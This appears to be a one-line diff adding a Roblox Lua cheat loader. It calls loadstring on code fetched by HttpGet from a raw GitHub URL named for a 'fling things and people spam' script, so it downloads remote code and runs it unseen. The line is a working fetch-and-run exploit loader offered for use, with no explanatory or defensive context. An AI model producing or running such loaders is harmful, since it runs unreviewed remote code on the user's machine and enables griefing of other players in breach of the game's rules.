@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/fling-things-and-people-spam6-83ufj9jbf6vnzl.lua"))()
